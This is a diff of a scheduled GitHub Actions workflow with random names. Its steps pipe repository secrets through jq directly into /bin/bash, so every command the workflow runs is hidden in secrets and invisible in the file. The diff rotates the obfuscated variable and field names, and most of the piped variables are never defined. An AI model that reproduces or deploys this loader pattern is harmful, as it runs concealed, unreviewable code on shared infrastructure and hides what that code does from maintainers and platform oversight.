@@ -1,31 +1,21 @@
 name: caoyuantt
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 3/6 * * *'
-jobs:  # 16103
+    - cron: '4 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: caoyuantt
         env:
-          lbrx92226: ${{ secrets.lbrx92226 }}
+          porm1594: ${{ secrets.porm1594 }}
         run: |
-          echo $lbrx92226 | jq -r .uq118 | /bin/bash
-          echo $alfi75338 | jq -r .ry4 | /bin/bash
-          echo $gq8160 | jq -r .lq345 | /bin/bash
-          echo $ugt67 | jq -r .qbj0 | /bin/bash
-          echo $wi3 | jq -r .uha16435 | /bin/bash
-          echo $dcra82231 | jq -r .thrw74 | /bin/bash
-          echo $f4003 | jq -r .ali742 | /bin/bash
-          echo $k243 | jq -r .e4682 | /bin/bash
-          echo $d4 | jq -r .mqxf70409 | /bin/bash
-          echo $iln29276 | jq -r .r51259 | /bin/bash
-          echo $yy93879 | jq -r .neop6291 | /bin/bash
-          echo $auma0 | jq -r .ehcz3 | /bin/bash
-          echo $jxpvy509 | jq -r .e37004 | /bin/bash
-          echo $lvd32 | jq -r .bp99 | /bin/bash
-          echo $zy2631 | jq -r .f6610 | /bin/bash
+          echo $porm1594 | jq -r .cric229 | /bin/bash
+          echo $vuv1648 | jq -r .nf8429 | /bin/bash
+          echo $jz12 | jq -r .raqe70395 | /bin/bash
+          echo $ejy197 | jq -r .lzxbz7 | /bin/bash
 
